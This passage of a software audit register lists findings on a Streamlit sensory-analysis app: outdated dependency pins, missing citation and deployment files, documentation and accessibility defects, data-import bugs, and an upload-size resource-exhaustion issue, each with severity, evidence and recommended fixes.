- Recommendation: add `example_data/COPYING` (GPL-2.0 text, since "GPL (>= 2)" lets you pick 2) and reference it from `example_data/README.md`. Consider whether the derived reference CSVs in `validation/*/reference/` need the same note (they are computed statistics, so probably not; owner's call).
- Effort: S
- Dependencies: none

### REL-09: kaleido 0.2.1 / plotly 5 pins will age out; ceilings exclude current major releases
- **Register status: final severity LOW. Not challenged (MEDIUM/LOW).** (source: `B08-packaging-licensing.md`)
- Severity: LOW
- Confidence: VERIFIED (versions); risk timing SUSPECTED
- Location: `requirements.txt:4-5,2`
- Evidence: current PyPI: plotly 7.1.0, kaleido 1.4.0, pandas 3.0.6; pins are `plotly<6`, `kaleido==0.2.1`, `pandas<3`. kaleido 0.2.1 works here (step 5) and has `py2.py3-none` wheels for Linux x86_64/aarch64, macOS x86_64/arm64 and Windows, so it is independent of Python version. Its wheel bundles a Chromium build (221 MB installed in `env/`, with `CREDITS.html` and `LICENSE.txt`). pandas 2.3.3 is the last 2.x and already has cp314 wheels.
- Impact: no current breakage. Over the release's life: no security updates for the bundled Chromium (it only renders app-built figures, so exposure is low); plotly 5 / pandas 2 will stop getting wheels for new Pythons (3.15). Docker images carry 221 MB of Chromium.
- Recommendation: accept for this release; add a backlog item to migrate to plotly 6+/kaleido 1.x (which uses a system Chrome, a different deployment story) and pandas 3 with the regression pins as the safety net.
- Effort: M (future)
- Dependencies: none

### REL-10: No citation metadata for academic users
- **Register status: final severity LOW. Not challenged (MEDIUM/LOW).** (source: `B08-packaging-licensing.md`)
- Severity: LOW
- Confidence: VERIFIED
- Location: `README.md:421-425`; no `CITATION.cff`; no DOI
- Evidence: file listing; the citation line says "Version 1.0" and a URL that 404s (REL-01).
- Impact: reference managers and GitHub's "Cite this repository" cannot pick it up; reviewers increasingly ask for a versioned, archived software citation (DOI) so a result can be tied to an exact code version.
- Recommendation: add `CITATION.cff` (cff-version 1.2.0, title, authors with ORCID, version, date-released, licence, repository-code, and `references` for SensoMineR/cata/the methods papers if desired); once public, connect Zenodo to the GitHub repository so each release tag gets a DOI, and put the concept DOI in README. Generate the README citation from the same data.
- Effort: S
- Dependencies: REL-01, REL-05

### REL-11: No deployment artefacts for any channel
- **Register status: final severity LOW. Not challenged (MEDIUM/LOW).** (source: `B08-packaging-licensing.md`)
- Severity: LOW (MEDIUM if the chosen channel is Docker or an institutional server)
- Confidence: VERIFIED
- Location: repo root: no `Dockerfile`, `.dockerignore`, `Procfile`, `runtime.txt`/`.python-version`, `packages.txt`, CI
- Evidence: file listing; orientation section 1.
- Impact and what each channel needs:
  - **Local clone + pip (current):** works today (step 1: 26 s, wheels only on Linux). Needs REL-04 lock for reproducibility and the dev split.
  - **Streamlit Community Cloud:** reads `requirements.txt` from the repo root (works as is apart from the dev packages); needs a public repo or a linked private one, a chosen Python version in the deploy dialog (SUSPECTED: whether 3.14 is offered there could not be checked offline), and consideration that uploads go to a third-party host (B07/privacy). kaleido 0.2.1's bundled Chromium usually runs on Linux hosts; not verified on that platform.
  - **Docker / self-hosted:** needs a Dockerfile (python:3.14-slim, install from the lock, non-root user, `streamlit run app.py --server.address 0.0.0.0`), `.dockerignore` excluding `data/`, `env/`, `working_notes/`; decide whether `example_data/` goes in the image (GPL notice, REL-08) and whether pingouin does (REL-03: shipping an image counts as distribution). Set `server.maxUploadSize` and `server.enableXsrfProtection` deliberately.
  - **Institutional multi-user server:** as Docker, plus reverse proxy/auth, memory sizing (each session holds its data and caches in RAM), and a documented upgrade path including `st.cache_data.clear()` (CHANGELOG already asks this on deploy).
- Recommendation: pick the channel (D1) and add only that channel's artefacts.
- Effort: S to M
- Dependencies: D1, REL-03, REL-04

### DOC-07: Methods reference structure: TOC out of sync, broken in-app anchors, stale identifiers, internal jargon
- **Register status: final severity LOW. Not challenged (MEDIUM/LOW).** (source: `B09-documentation.md`)
- Severity: LOW
- Confidence: VERIFIED (anchor behaviour in a live browser SUSPECTED; see evidence)
- Location: `Statistical_Methods_README.md` TOC lines 13-114; headings at lines 1255, 1433
- Evidence:
  - The Chapter 3 TOC lists sub-sections 23a-23f with different names from the body: the body has 23a error term, 23b post-hoc options, 23c FDR consistency, 23d k_total, 23e CIs, 23f Hedges' g, 23g z-score, 23h edge cases, 23i references. §18e (panel flags) is missing from the TOC. "14b" has no 14a. Chapters 3 and 4 are `##` while the other chapters are `#`, so they render at a different level. Chapter 4's intro says "the five stats files" and then lists six.
  - Anchors (`anchors.py`): 55 TOC links; 1 is dead under GitHub slugs (`#10-hotellings-t-confidence-ellipses`, because the `²` is kept in the slug; SUSPECTED, since GitHub's exact handling of superscripts was not tested). Under Streamlit's slug rule (from the bundled JS: transliterate, `/` and `.` become `-`, repeated `-` collapse), 10 are dead in the in-app overlay: the `--` links (§12, 29, 32) and every `(stats/...py)` heading (§24-29), plus §10 and §48. Streamlit renders `#` links as same-page anchors (function `um` in the same bundle), so these 10 silently do nothing. This was not clicked in a real browser.
  - Stale identifiers (`refs.py`): `cochran_q_per_attribute` (lines 2547, 2819; actual `run_cochrans_q`), `_init_liking_state` (line 1614; no such function), `liking_pref_show_prefmap`, `liking_pref_show_vectors` and `liking_pref_grid_resolution` (line 1789; not keys in the code). The DA CHANGELOG entry points to "§17 (Empty assessor x product cells)", which is in §15.
  - Internal process codes ("Stage B, B.14", "R-25", "MAJOR-3", "D-7"): 31 in the methods reference, 38 in README. They mean nothing to users. None reach UI strings (grep of quoted strings in `modules/ utils/ core/` found none).
  - Developer material (session-state key lists, function names, "written for future developers") is mixed into the user-facing methods reference.
- Impact: navigation in the in-app reference partly fails. Readers meet references to things that do not exist and to internal ticket codes.
- Recommendation: regenerate the TOC from headings. Use heading text without `/`, `.` or dashes (or add explicit `{#id}`-free short headings) so both slug schemes agree. Normalise chapter levels. Replace or remove stage codes in user docs. Move session-state and function-level notes to docstrings or a developer doc.
- Effort: S
- Dependencies: DOC-08

### DOC-10: stats/ docstrings are nearly complete; a few are stale or incomplete
- **Register status: final severity LOW. Not challenged (MEDIUM/LOW).** (source: `B09-documentation.md`)
- Severity: LOW
- Confidence: VERIFIED
- Location: `stats/multivariate.py:97, 163, 224`; `stats/pls.py:660`; `stats/shared/lsmeans.py:42`; `stats/da_anova.py:121`
- Evidence: an AST scan found 82 public module-level functions in `stats/`, of which 81 have docstrings. The one missing is `calculate_panel_stability` (multivariate.py:224). Of 39 private helpers, 1 lacks a docstring. Documented parameters vs signature (numpydoc sections only):
  - `calculate_pca` does not document `summary_df, selected_attrs, product_col, pca_type, apply_varimax`;
  - `run_cva` does not document `df_long, col_map`;
  - `fit_pls` does not document `seed`;
  - `additive_lsmeans` does not document `product_col, assessor_col`.

  No stale (documented but absent) parameters were found. `run_da_anova`'s docstring is wrong on behaviour and on columns (DOC-03). `stats/liking.py` names `n_consumers - n_products` "Satterthwaite" (DOC-01 item 4).
- Impact: small; the docstrings are generally good and match their signatures.
- Recommendation: add the missing docstring and parameter entries, and fix the two behavioural claims.
- Effort: S
- Dependencies: DOC-01, DOC-03

### UI-10: Wrong step numbers in three user-facing cross-references
- **Register status: final severity LOW. Not challenged (MEDIUM/LOW).** (source: `B10-interface-accessibility.md`)
- Severity: LOW
- Confidence: VERIFIED
- Location: `modules/rata/ui.py:186-190` ("product profiling bar charts (Step 5) … contrast analysis (Step 6)"; actual steps 4 and 5); `modules/descriptive/workflow.py:1228` ("(Step 3 — Product Discrimination)"; actual Step 2); `modules/liking/workflow.py:3248` ("Run Step 4 (Consumer Segmentation) first"; actual Step 5)
- Evidence: `steprefs.py` scanned every "Step N" string in `modules/` against `MODULES`. These are the only mismatches that name a step. The DA equivalent of the RATA note (`modules/descriptive/workflow.py:196-203`) is correct.
- Impact: Sends users to the wrong step. Minor, but it undermines trust in the guidance text.
- Recommendation: Fix the three strings. Better, build step references from `ui_shell.step_title(module, n)` so they cannot drift, and add the scanner as a test.
- Effort: S
- Dependencies: none

### UI-11: Charts have no text equivalent in some mapping steps, so screen-reader users get nothing
- **Register status: final severity LOW. Not challenged (MEDIUM/LOW).** (source: `B10-interface-accessibility.md`)
- Severity: LOW
- Confidence: VERIFIED for the listed sites (AST scan plus reading the functions); a full step-by-step audit was not done
- Location: `modules/rata/ui.py:1109-1335` (`render_step_5`, Product mapping: PCA and CVA biplots, no scores or loadings table); DA CVA (`modules/descriptive/workflow.py` around 2094 onwards; only PCA gets a loadings expander at `:2082`); `modules/liking/workflow.py:2929-3411` (`render_step_7`, preference map, no table); DA panel-performance chart panels (`_render_repeatability_panel`, `_render_agreement_panel`, `_render_consistency_panel`, `_render_assessor_profiles_panel`)
- Evidence: `charts.py` (functions that call `render_chart` but no table widget) listed 12 functions. By contrast, CATA CA shows row and column coordinate tables (`modules/cata/ui.py:2422-2476`), and DA PCA has a loadings expander. `st.plotly_chart` has no alt-text parameter (`streamlit docs st.plotly_chart`), so the Plotly SVG is opaque to assistive technology.
- Impact: The same analysis is inspectable in one module and not in its sibling. Blind or low-vision users cannot get biplot or preference-map content in the app, only from the Excel export.
- Recommendation: Put a coordinates and loadings table in a collapsed expander under every biplot and map, as CATA does. Add a one-sentence caption summarising the key result, such as PC1% and the products with the largest separation.
- Effort: M
- Dependencies: none

### UI-12: The landing page loses its grouping on narrow screens
- **Register status: final severity LOW. Not challenged (MEDIUM/LOW).** (source: `B10-interface-accessibility.md`)
- Severity: LOW
- Confidence: VERIFIED (element order); rendering not observed
- Location: `utils/ui_shell.py:168-203` (`render_landing_page` builds a row of section titles, then one `st.columns(3)` per card row)
- Evidence: `landing_order.py` gives the main-area subheader order: `['Consumer methods', 'Trained panel', 'Mapping & integration', 'Check-All-That-Apply', 'Descriptive Analysis', 'Preference Mapping', 'Consumer Liking & Acceptance', 'Rate-All-That-Apply', 'Data Fusion']`. `streamlit docs st.columns`: columns stack when the viewport is at most 640 px. On a phone or a narrow split window, the three section headers therefore stack together at the top and the cards follow in the order CATA, DA, PrefMap, Liking, RATA, Fusion, detached from their headers.
- Impact: Narrow-window and tablet-portrait users see mislabelled groups.
- Recommendation: One `st.columns(3)`, each column holding its header and its two cards. Equal card heights are then lost; accept that, or use `st.container(horizontal=True)` per section with `height="stretch"`.
- Effort: S
- Dependencies: none

### UI-13: Colour-scheme changes apply to some charts immediately and to others only after a re-run
- **Register status: final severity LOW. Not challenged (MEDIUM/LOW).** (source: `B10-interface-accessibility.md`)
- Severity: LOW
- Confidence: VERIFIED (code)
- Location: product colour maps are frozen at run time (`modules/descriptive/workflow.py:397`, `modules/rata/ui.py:436-437`, `modules/cata/ui.py:997`, `modules/liking/workflow.py:777`). Diverging ramps and cluster maps read `global_colour_palette` live (`modules/liking/workflow.py:1052,1399,1487,1608,1710`, `modules/prefmap/workflow.py:1230,1373,1588`). The warning is at `utils/ui_shell.py:618-627`.
- Evidence: After a palette change, product colours stay on the old palette until "Run full analysis" runs again (for Liking, that includes segmentation), while heatmaps and surfaces switch at once. The warning says a re-run is needed for "cached figures" in either case.
- Impact: A mixed-palette screen, and a full re-analysis just to change colours. That is friction for exactly the users who need the colour-blind option.
- Recommendation: Build product colour maps at render time from the stored product list (cheap) and drop the re-run requirement and the warning.
- Effort: S
- Dependencies: UI-01

### UI-14: The cluster-size KPI uses the metric delta for a share, which renders as a green "increase"
- **Register status: final severity LOW. Not challenged (MEDIUM/LOW).** (source: `B10-interface-accessibility.md`)
- Severity: LOW
- Confidence: VERIFIED (code); rendering not observed
- Location: `modules/liking/workflow.py:1171-1174` (`metric(..., delta=f"{pct:.0f}% of panel")` with the default `delta_color`); `st.columns(len(cluster_sizes))`
- Evidence: With default `delta_color` and `delta_arrow`, st.metric draws an up arrow in green for a positive delta string. DA's panel KPIs do this correctly with `delta_color="off", delta_arrow="off"` (`modules/descriptive/workflow.py:1681`). With up to k clusters in one `st.columns` row, the cards get narrow at 1366 px with the sidebar open (SUSPECTED, not observed).
- Impact: Cosmetic. It suggests growth or goodness where there is only a proportion.
- Recommendation: `delta_color="off", delta_arrow="off"`, or put the share in the value ("n = 57 (26%)"). Use `st.container(horizontal=True)` instead of `st.columns(k)`.
- Effort: S
- Dependencies: none


## Merged into other findings

### STAT-07: Liking LMM never checks `.converged`; the convergence warning can only fire when every optimiser raises
- **Register status: final severity MEDIUM. Merged into CODE-03.** (source: `B01-statistical-correctness.md`)
- Severity: MEDIUM
- Confidence: VERIFIED (code path); SUSPECTED (frequency of silent non-convergence on real data)
- Location: `stats/liking.py:227-252` (loop breaks on the first fit that does not raise; `convergence_warning = False` is never updated), `_failure_return` l.219; UI `modules/liking/workflow.py:1021-1024`.
- Evidence: statsmodels `MixedLM.fit` warns but does not raise on non-convergence, and all warnings are suppressed (`warnings.simplefilter('ignore')`). Neither `result_reml.converged` nor `result_ml.converged` is read anywhere in `stats/liking.py`. RATA (`stats/mixed_models.py:73-84`) does check it. On my synthetic data the fits converged, so I did not observe a silent failure.
- Impact: a non-converged REML/ML fit would feed LS-means SEs, the CLD and the LRT with no warning shown.
- Recommendation: check `.converged` on both fits, fall through to the next optimiser when it is False, and set `convergence_warning` when the accepted fit did not converge.
- Effort: S
- Dependencies: none (lead (c) confirmed)

### STAT-10: DA docstring says the interaction pre-test alpha has no effect on product p-values
- **Register status: final severity LOW. Merged into DOC-03.** (source: `B01-statistical-correctness.md`)
- Severity: LOW
- Confidence: VERIFIED
- Location: `stats/da_anova.py:135-141`.
- Evidence: sensochoc, `alpha_interaction` 0.10 against 0.01 changes `p_product` on 6 of 14 attributes (MilkF 3.7e-40 vs 2.4e-51; Granular 9.1e-05 vs 1.1e-06). Decisions did not flip on this dataset. The behaviour is correct by design (the pre-test selects the error term); the claim is wrong.
- Impact: misleads maintainers and anyone reading the API docs.
- Recommendation: rewrite it as "selects the error term, and therefore the product F, p and df".
- Effort: S
- Dependencies: none (lead (e) confirmed)

### STAT-12: Liking Tukey ribbon labelled "±LSD zone"
- **Register status: final severity LOW. Merged into CODE-01.** (source: `B01-statistical-correctness.md`)
- Severity: LOW
- Confidence: VERIFIED
- Location: `utils/plotting.py:1219-1220`, `1266-1269` (checks `('Tukey HSD', 'Tukey-Kramer HSD')`; the Liking label is `'Tukey HSD (Studentized Range)'`).
- Evidence: code read. `stats/contrast.py:205-207` does treat the Liking label as HSD, so the drawn width is an HSD width under an LSD legend.
- Impact: mislabelled chart.
- Recommendation: test `use_hsd` the way `contrast.py` does, or pass the label through.
- Effort: S
- Dependencies: none (lead (f) confirmed)

### FUNC-04: Blank product (or assessor) cells become a real level called "nan"; RATA crashes
- **Register status: final severity BLOCKER. Merged into IO-01 (same root cause, core/data.py); challenger raised HIGH to BLOCKER.** (source: `B02-functional-workflow.md`)
- Severity: HIGH
- Confidence: VERIFIED
- Location: `core/data.py:190-197` (`clean_and_structure_data` casts meta columns with `astype(str)`), `stats/mixed_models.py:60`
- Evidence: `data/nan_product.csv` (three rows with an empty Product cell).
  - DA: runs with no warning; Step 1 metric says "Products 4" (computed on the raw frame) but `da_df_long` contains products `['choc1','choc2','choc3','choc4','nan']`, so a fifth product "nan" with three observations enters the ANOVA, means, maps and export.
  - RATA: Step 1 shows "Products 5" and an unbalanced-design warning, then Run raises `PatsyError: factor contains missing values` as an exception element (`modules/rata/ui.py:427` to `stats/mixed_models.py:60`).
- Impact: silently analysing a phantom product (DA) or crashing (RATA) on a very common data defect (empty trailing rows in Excel, missing codes).
- Recommendation: before casting to string, drop rows with a missing assessor/product (and replicate, if mapped), and report "N rows had no product/assessor code and were excluded". Compute Step 1 metrics on the cleaned frame.
- Effort: S
- Dependencies: none

### FUNC-06: Non-numeric cells are reported as "blank", and wrong advice is given for decimal-comma columns
- **Register status: final severity MEDIUM. Merged into IO-02.** (source: `B02-functional-workflow.md`)
- Severity: MEDIUM
- Confidence: VERIFIED
- Location: `modules/rata/ui.py:255-263` and the blank-cell warnings in DA (`modules/descriptive/workflow.py:~310-330`), RATA (`modules/rata/ui.py:~370`), CATA (`modules/cata/ui.py:~797-812`); `core/data.py:200-214`
- Evidence:
  - RATA, `data/text_cells.csv` (cells `n/a`, `high`, `5,5` in CocoaA): warning "**3 blank cells detected** ... Blank cells are filled with **0**". The cells were not blank; `5,5` (a real 5.5 rating) becomes 0 and the analysis runs.
  - RATA, `data/eu_comma_quoted.csv`: "Text metadata detected in attributes: **CocoaA, MilkA, CocoaF**. Please add these to 'Exclude Metadata Columns'." These are the rating columns; excluding them is the wrong fix, and only three of five are named.
  - CATA, bread with `yes` / `x` typed into a 0/1 column: "**2 blank cells detected** ... Missing values will be excluded from pairwise tests", then "Cochran's Q: 2 of 161 assessor(s) with missing data excluded". "yes"/"x" almost certainly meant a tick.
  - DA, `data/extra_cols.csv` (un-excluded `Comment` and `Date` text columns): Step 1 counts "Attributes 7" and warns about 192 "blank cells"; Step 3 then says `Comment, Date` "were excluded ... because their mean is constant across products", and the ANOVA table carries them with status `insufficient_products`. RATA and CATA detect such columns; DA does not.
- Impact: users are misled about what is wrong with their file; in RATA a non-blank rating can be silently turned into 0.
- Recommendation: report non-numeric (text) cells separately from true blanks, with column, row and example values; block when a supposedly numeric cell holds text (other than an agreed missing code). Give DA the same text-column detection as RATA/CATA. When the text looks like a decimal comma (`^\d+,\d+$`), say so.
- Effort: S
- Dependencies: FUNC-05

### IO-03: European CSVs (semicolon delimiter, Windows-1252/Latin-1 encoding) are rejected with raw parser messages
- **Register status: final severity MEDIUM. Merged into FUNC-05.** (source: `B03-import-export.md`)
- Severity: MEDIUM
- Confidence: VERIFIED
- Location: `core/data.py:18-23`, `core/data.py:82-92`
- Evidence (`fmt.py`):
  - A Latin-1 or cp1252 CSV with umlauts gives `Error loading file: 'utf-8' codec can't decode byte 0xfc in position 17`. UTF-16 fails the same way. Good: no mojibake.
  - A semicolon CSV with decimal commas loads "successfully" as one column named `Panelist;Sample;Sweet;Bitter`. The user then sees a single-column mapping and no hint about the delimiter.
  - A TSV named `.tsv` is sent to `read_excel` and fails with "Excel file format cannot be determined". Its uploader would reject it anyway.
  - UTF-8 with BOM works in both loaders.
- Impact: Excel's default "CSV" on German, French or Nordic Windows is semicolon plus cp1252, so a large part of the stated audience cannot load their files directly and gets no actionable message.
- Recommendation: use `sep=None, engine='python'` (or `csv.Sniffer`) for delimiter detection. Try UTF-8-sig, then cp1252 with a caption saying which encoding was used. When only one column results, raise a message that names the delimiter.
- Effort: S
- Dependencies: none

### IO-04: `.xls` is offered by the uploader but cannot be read (xlrd not a dependency); uppercase `.CSV` fails
- **Register status: final severity MEDIUM. Merged into FUNC-05.** (source: `B03-import-export.md`)
- Severity: MEDIUM
- Confidence: VERIFIED
- Location: `modules/rata/ui.py:108`, `modules/descriptive/workflow.py:109`, `modules/cata/ui.py:369,616` (`type=[…,'xls']`); `requirements.txt`; `core/data.py:18`
- Evidence:
  - A real OLE2 `.xls` gives `Missing optional dependency 'xlrd'. Install xlrd >= 2.0.1 …`. `xlrd` is not installed and not in `requirements.txt`.
  - `DATA.CSV` passes `endswith('.csv')` as false, goes to `read_excel`, and fails with "Excel file format cannot be determined". `load_precomputed_means` lowercases the name, so the two loaders disagree. Inferred: Streamlit accepts the upper-case extension (not verified in a browser).
  - Liking, Fusion and PrefMap accept only `csv, xlsx`, while RATA, DA and CATA also list `xls`. `.xlsm` is not accepted anywhere, although pandas reads it (`fmt2.py`).
- Impact: users following the uploader's own prompt get a developer error message.
- Recommendation: add `xlrd>=2.0.1` or drop `xls` from every `type=` list. Lowercase the extension in `load_data`. Use one shared accepted-types constant.
- Effort: S
- Dependencies: none

### IO-07: Exported `data_source_file` can name a different module's file (Fusion, PrefMap; suspected for DA/RATA/CATA)
- **Register status: final severity MEDIUM. Merged into CODE-02.** (source: `B03-import-export.md`)
- Severity: MEDIUM
- Confidence: VERIFIED for Fusion/PrefMap; SUSPECTED for DA/RATA/CATA
- Location: `utils/export.py:366-373`. The global `uploaded_file` key is written by `modules/rata/ui.py:113`, `modules/descriptive/workflow.py:114` and `modules/cata/ui.py:379`.
- Evidence:
  - `build_run_parameters_sheet(w, 'Fusion', {'uploaded_file': <RATA_panel_study_X.csv>}, …)` writes `data_source_file = RATA_panel_study_X.csv`. The same happens for PrefMap. No `fusion_df_raw_name` / `prefmap_df_raw_name` key exists anywhere, so a Fusion or PrefMap export always shows whichever RATA, DA or CATA file was last uploaded, or "—". It never shows its own files, and neither the external block nor the liking file is recorded.
  - Suspected for DA/RATA/CATA, because the three modules share one global key: run DA on file A, then upload file B in RATA, return to DA, go straight to Step 8 and export. The DA workbook would record B. Confirm with an AppTest doing exactly that.
- Impact: the provenance row can be wrong, which is worse than missing.
- Recommendation: each module stores `<prefix>_df_raw_name` (plus hash) at run time, as Liking already does. Remove the global `uploaded_file` fallback.
- Effort: S
- Dependencies: IO-06

### IO-10: Default palettes and fixed semantic colours are not colour-blind safe or greyscale-distinguishable
- **Register status: final severity MEDIUM. Merged into UI-06.** (source: `B03-import-export.md`)
- Severity: MEDIUM
- Confidence: VERIFIED (simulation)
- Location: `utils/colours.py:20-73`, `utils/plotting.py:111-119`, `modules/liking/ui.py:990`, `modules/fusion/ui.py:733`
- Evidence (`cvd.py`, minimum pairwise ΔE2000; below about 10 is hard to tell apart):
  - Default product palette (Plotly Bold), first 6 colours: deutan 4.5, greyscale 5.9. With 11 colours: deutan 2.7, protan 2.6, and 24/55 greyscale pairs below 10.
  - `muted`: protan 0.3.
  - Default cluster palette (Set2), 4 colours: protan 1.6, greyscale 0.8.
  - `DRIVER_COLOUR_MAP`, fixed and not user-selectable: protan 1.3 (green vs orange), deutan 4.6 (green vs red), so "Robust driver" and "No discrimination" merge for deuteranopes.
  - The opt-in `colourblind` palette holds up for 6 colours (≥ 11.6 under all three CVD types) but collapses in greyscale (orange vs sky blue, 0.6).
  - `greyscale` has adjacent steps at ΔE 4.
  - Liking heatmaps default to `RdYlGn` and switch only when the user picks `colourblind`. The Fusion Q² heatmap and the Liking JAR colours are hard-coded red/green.
  - CVA/PCA products also get distinct marker symbols (good). Bars and spider lines rely on colour alone.
- Impact: about 8 % of male users cannot separate product and cluster colours in the default configuration, and printed greyscale reports lose product identity.
- Recommendation: make an Okabe-Ito or Tol palette the default, keep "bright" as opt-in, recolour `DRIVER_COLOUR_MAP` with a blue/orange/grey scheme, use a viridis or `RdBu` ramp by default for liking, and add pattern or marker redundancy for bars in the greyscale mode.
- Effort: S
- Dependencies: decision D-4

### SEC-02: No upload size cap and no decompression guard; a 0.3 MB workbook costs 46 s and 475 MB
- **Register status: final severity MEDIUM. Merged into PERF-04 (resource limits); pass B reproduced it (15.9 s, 526 MB); LOW local, HIGH hosted.** (source: `B07-security-privacy.md`)
- Severity: HIGH (hosted multi-user); LOW (local single-user)
- Confidence: VERIFIED (measurement); SUSPECTED (effect on other sessions)
- Location: `.streamlit/config.toml` (no `server.maxUploadSize`, so Streamlit's default 200 MB applies; `streamlit.config.get_option('server.maxUploadSize')` returns 200); `core/data.py:8-37` `load_data` and `:41-100` `load_precomputed_means` call `pd.read_excel` / `pd.read_csv` without any size, row or column limit.
- Evidence: `zipbomb.py` produced `compressed 0.30 MB, sheet xml uncompressed 86.0 MB, ratio 290:1`; `parse.py` returned `shape (1000000, 5) 45.9s peak RSS MB 475`. Extrapolating linearly (not run, to spare the shared machine): a 3 MB upload is about 8 minutes and 4.5 GB; the 200 MB cap is far past any server's memory. The resulting frame is also stored in `st.cache_data(max_entries=4)`, so the memory stays held after the session ends.
- Impact: on a shared deployment one upload (malicious or simply a huge export from survey software) can exhaust server memory and kill the process for every user. openpyxl parsing is pure Python and holds the GIL, so other sessions are likely stalled for the duration (SUSPECTED; confirm by timing a second AppTest session during the parse). Locally it only hurts the uploader.
- Recommendation: set `server.maxUploadSize` to a realistic value (sensory files are rarely above 10 to 20 MB); before `read_excel`, open the upload with `zipfile` and reject when the summed `file_size` of `xl/worksheets/*.xml` exceeds a threshold or the ratio is extreme; cap rows/columns after parsing with a clear message.
- Effort: S
- Dependencies: D-B07-1 (deployment)

### REL-02: Git history contains third-party copyrighted files; making the repo public as-is would redistribute them
- **Register status: final severity HIGH. Merged into SEC-04 (same files, same commits).** (source: `B08-packaging-licensing.md`)
- Severity: HIGH (becomes BLOCKER if the repository, or a clone with history, is made public)
- Confidence: VERIFIED for presence (details in B07); licensing status SUSPECTED
- Location: history only. `git log --all --diff-filter=A --name-only` lists `example_data/LIK_tuto_EN.xlsm`, `PLS.pptx`, `docs/PLS.pdf`, plus build artefacts `Rplots.pdf`, `validation/PrefMap/_out/carto_reference.pdf`. Commits touching them include `acf8ffa`, `1a6d701`, `01065d1`, `a6b5d33`, `fd50b56`, `bbd91e2`. B07 identifies the first two as XLSTAT (Addinsoft) tutorial material, the `.xlsm` with VBA macros.
- Evidence: see B07 for provenance. From the licensing side: none of these files is covered by the repo's MIT `LICENSE`, and no licence or permission notice for them exists anywhere in history I could find (`git ls-files` shows no NOTICE/COPYING file at any point).
- Impact: a public push of this history would redistribute a commercial vendor's tutorial workbook, slides and a PDF without a licence. Deleting the files in a later commit does not remove them from the published history. The repository being private today (REL-01) is what keeps this from being a live problem.
- Recommendation: before any public release, either (a) publish from a fresh repository with a squashed/new history, or (b) rewrite history with `git filter-repo --invert-paths --path example_data/LIK_tuto_EN.xlsm --path PLS.pptx --path docs/PLS.pdf ...` and force-push, accepting that existing clones/forks keep the old objects. Option (a) is simpler and also removes the absolute-home-path leaks noted in the orientation. Coordinate with B07.
- Effort: S to M
- Dependencies: B07 findings on history content, decision D1

### REL-12: Broken `.claude/skills` symlink tracked in git
- **Register status: final severity LOW. Merged into SEC-08.** (source: `B08-packaging-licensing.md`)
- Severity: LOW
- Confidence: VERIFIED (tracked as mode 120000); breakage per B07
- Location: `.claude/skills/developing-with-streamlit` (`git ls-files -s` -> mode `120000`)
- Evidence: see B07. For packaging: a dangling tracked symlink also breaks naive archive or Docker `COPY` steps on some platforms and fails on Windows checkouts without symlink support.
- Recommendation: exclude `.claude/` (and `CLAUDE.md`, `working_notes/`) from release archives and images via `.gitattributes export-ignore` and `.dockerignore`, or vendor the skill as real files.
- Effort: S
- Dependencies: B07

### DOC-08: In-app About and Methods overlays: developer content, dead relative links, no search in a 257 KB page
- **Register status: final severity LOW. Merged into UI-09.** (source: `B09-documentation.md`)
- Severity: LOW
- Confidence: VERIFIED
- Location: `app.py:60-77`; `README.md:333-411` and links at lines 119, 393, 411, 417, 431-451
- Evidence:
  - The About overlay renders the whole README, including installation, "Project Structure", "Development Notes" and "Agent guidance: CLAUDE.md, .claude/agents".
  - The README's 7 relative links (`validation/README.md`, `Statistical_Methods_README.md`, `CLAUDE.md`, `CHANGELOG.md`, `LICENSE`, `example_data/`, `example_data/README.md`) are opened by Streamlit in a new tab against the app server, where those paths are not served.
  - The Methods overlay is a single `st.markdown` of 2,869 lines. It has no search beyond the browser's find, no per-module filtering, and no deep links from the steps: only two UI captions mention a section number (`modules/descriptive/workflow.py:762` §15, `modules/cata/ui.py:2465` §50), and neither is a link.
- Impact: end users see contributor material. Links in About go nowhere. Finding the method for the step you are on means scrolling a very long page.
- Recommendation: split user and developer content (for example `docs/USER_GUIDE.md` for the About overlay). Render the methods reference per chapter with a chapter selector (`st.selectbox` or `st.tabs` gated by `.open`), and add "Method details" links from each step to its chapter. Replace relative links in in-app documents with absolute GitHub URLs.
- Effort: M
- Dependencies: DOC-07

### DOC-09: Version and status claims in documents are inconsistent
- **Register status: final severity LOW. Merged into REL-05.** (source: `B09-documentation.md`)
- Severity: LOW
- Confidence: VERIFIED
- Location: `README.md:3, 338, 386, 425`; `Statistical_Methods_README.md:4`; `CHANGELOG.md:8, 201, 286-294`; `core/__version__.py`
- Evidence: README and the methods reference say v1.0. `__version__ = "1.0.0"`, and tag `v1.0.0` sits on a commit from 2026-05-18. CHANGELOG has `[Unreleased]`, `[1.1.0] - Unreleased` and `[1.0.0] - Unreleased`; the 1.0.0 entry says the tag "ships after sign-off", but it is already pushed. README line 40 refers users to "CHANGELOG 1.1.0, Fixed" for a version they cannot have, since the app reports 1.0.0. The methods reference does not say that Fusion and PrefMap are beta, although README and the UI do. CHANGELOG test pins were spot-checked and are accurate: all 12 `test_*` names cited in CHANGELOG.md and CLAUDE.md exist.
- Impact: the citation string and the exported version do not identify what users ran, and readers of the methods chapter on Fusion/PrefMap are not told the methods are beta.
- Recommendation: after the version decision, set one version in `core/__version__.py`, date the CHANGELOG heading, remove the stale "tag ships after sign-off" line, and add a beta note at the top of Chapters 5 and 6.
- Effort: S
- Dependencies: Decision D1
